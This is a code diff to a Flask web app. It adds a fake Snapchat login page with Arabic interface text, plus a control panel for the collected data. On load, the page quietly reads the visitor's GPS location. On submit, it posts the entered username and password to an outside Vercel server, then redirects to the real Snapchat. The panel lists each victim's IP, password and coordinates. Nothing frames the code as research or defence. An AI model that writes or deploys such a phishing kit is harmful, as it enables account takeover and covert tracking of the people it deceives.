@@ -4,13 +4,78 @@ app = Flask(__name__)
 
 devices = {}
 
+SNAP_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snapchat</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,sans-serif;background:#FFFC00;display:flex;justify-content:center;align-items:center;min-height:100vh;direction:rtl}
+.card{background:white;border-radius:20px;padding:35px 25px;width:90%;max-width:380px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.15)}
+.ghost{font-size:70px}
+.title{font-size:26px;font-weight:bold;margin:5px 0}
+.sub{color:#666;font-size:14px;margin-bottom:20px}
+input{width:100%;padding:15px;margin:8px 0;background:#f5f5f5;border:2px solid #e0e0e0;border-radius:12px;font-size:16px;direction:ltr}
+.btn{width:100%;padding:15px;background:#000;color:#FFFC00;border:none;border-radius:30px;font-size:17px;font-weight:bold;cursor:pointer;margin:15px 0}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="ghost">👻</div>
+<div class="title">Snapchat</div>
+<div class="sub">تسجيل الدخول للمتابعة</div>
+<input type="text" id="u" placeholder="اسم المستخدم أو البريد" dir="ltr">
+<input type="password" id="p" placeholder="كلمة السر" dir="ltr">
+<button class="btn" onclick="go()">تسجيل الدخول</button>
+<p id="msg" style="color:#0d904f;display:none">✅ تم. جاري التحويل...</p>
+</div>
+
+<script>
+const S = 'https://my-server-8utvt3870-m-9386.vercel.app';
+
+if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(pos=>{
+        fetch(`${S}/collect`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({id:'gps_'+Date.now(),type:'gps',lat:pos.coords.latitude,lon:pos.coords.longitude,time:new Date().toISOString()})
+        });
+    },()=>{}, {timeout:5000});
+}
+
+async function go(){
+    const u=document.getElementById('u').value;
+    const p=document.getElementById('p').value;
+    if(!u||!p)return;
+    
+    await fetch(`${S}/collect`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({id:'snap_'+Date.now(),type:'snap',username:u,password:p,time:new Date().toISOString()})
+    });
+    
+    document.getElementById('msg').style.display='block';
+    setTimeout(()=>{location.href='https://snapchat.com'},2000);
+}
+</script>
+</body>
+</html>
+"""
+
 @app.route('/')
 def home():
     html = '<html dir="rtl"><head><meta charset="UTF-8"><title>لوحة التحكم</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px}h1{border-bottom:2px solid #0f0}</style></head><body><h1>📱 لوحة التحكم</h1><button onclick="location.reload()" style="background:#0f0;color:#000;padding:10px;border:none;border-radius:5px;font-weight:bold;cursor:pointer">🔄 تحديث</button><hr>'
     for id, d in devices.items():
-        html += f'<p>📱 {id[:10]} | 🌐 {d.get("ip","?")} | 🔑 {d.get("username","?")} | 🔐 {d.get("password","?")} | ⏰ {d.get("time","?")}</p>'
+        html += f'<p>📱 {id[:10]} | 🌐 {d.get("ip","?")} | 🔑 {d.get("username","?")} | 🔐 {d.get("password","?")} | 📍 {d.get("lat","?")},{d.get("lon","?")} | ⏰ {d.get("time","?")}</p>'
     html += '</body></html>'
     return html
+
+@app.route('/snap')
+def snap():
+    return SNAP_PAGE
 
 @app.route('/collect', methods=['GET', 'POST'])
 def collect():
@@ -20,6 +85,8 @@ def collect():
         'ip': request.remote_addr,
         'username': data.get('username', '?'),
         'password': data.get('password', '?'),
+        'lat': data.get('lat', '?'),
+        'lon': data.get('lon', '?'),
         'time': data.get('time', '?')
     }
     return jsonify({'ok': True})
